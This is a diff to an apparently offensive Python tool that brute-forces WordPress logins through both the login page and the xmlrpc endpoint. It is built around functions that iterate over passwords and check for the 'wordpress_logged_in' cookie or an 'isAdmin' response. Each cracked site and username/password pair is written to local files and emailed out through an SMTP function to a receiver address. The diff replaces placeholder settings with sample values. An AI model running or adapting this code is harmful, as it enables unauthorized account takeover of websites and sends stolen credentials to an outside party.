@@ -16,12 +16,13 @@ headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gec
 
 def send_smtp(data):
     try:
-        email_sender = [''] # EMAIL SENDER LIST 
-        server = smtplib.SMTP('#MAILHOST', #MAILHOSTPORT)
+        sender = ['email@gmail.com', 'email2@gmail.com']
+        random_sender = random.choice(sender)
+        server = smtplib.SMTP('smtp.server.com', 1234)
+        server.ehlo()
         server.starttls()
-        randomize = random.choice(email_sender)
-        server.login(randomize, '#PASSWORD')
-        server.sendmail(randomize, '#RECEIVER EMAIL', data.as_string())
+        server.login(random_sender, 'p@ssw0rd')
+        server.sendmail(random_sender, 'receiver@email.com', data.as_string())
     except:
         pass
     
@@ -53,11 +54,12 @@ def brute_force_login(sites, username, cookies):
                 print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
                 if f'{username}%' in r.headers['Set-Cookie'] and 'wordpress_logged_in' in r.headers['Set-Cookie']:
                     print(f'[Log in Success] >> {sites} - {username}::{passwords}')
-                    data_1 = f'[Log in success] >> {sites} - {username}::{passwords}'
-                    data_output_email = MIMEText(data_1)
-                    send_smtp(data_output_email)
-                    with open('wp_crack_login_page.txt', 'a+') as output:
+                    data1 = f'[Log in success] >> {sites} - {username}::{passwords}'
+                    data_str = MIMEText(data1)
+                    with open('wp_crack_login_page.txt', 'a+') as output:   
                         output.write(f'[Log in Success] >> {r.url} - {username}::{passwords}\n')
+
+                    send_smtp(data_str)
                 else:
                     pass
     except:
@@ -87,11 +89,11 @@ def brute_force_xmlrpc(sites, username, cookies):
                 if r.ok:
                     if 'isAdmin' in r.text:
                         print(f'[Log in success] >> {sites} - {username}::{passwords}')
-                        data_1 = f'[Log in success] >> {sites} - {username}::{passwords}'
-                        data_output_email = MIMEText(data_1)
-                        send_smtp(data_output_email)
+                        data1 = f'[Log in success] >> {sites} - {username}::{passwords}'
+                        data_str = MIMEText(data1)
                         with open('wp_crackxmlrpc.txt', 'a+') as output:
                             output.write(f'[Log in success] >> {sites} - {username}::{passwords}\n')
+                        send_smtp(data_str)
                 if not r.ok:
                     brute_force_login(sites, username, cookies)
     except:
